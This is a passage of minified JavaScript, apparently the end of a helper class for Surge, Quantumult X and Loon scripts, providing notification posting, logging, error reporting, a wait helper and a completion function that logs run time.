t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r)));let h=["","==============\ud83d\udce3\u7cfb\u7edf\u901a\u77e5\ud83d\udce3=============="];h.push(e),s&&h.push(s),i&&h.push(i),console.log(h.join("\n")),this.logs=this.logs.concat(h)}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`\u2757\ufe0f${this.name}, \u9519\u8bef!`,t.stack):this.log("",`\u2757\ufe0f${this.name}, \u9519\u8bef!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`\ud83d\udd14${this.name}, \u7ed3\u675f! \ud83d\udd5b ${s} \u79d2`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}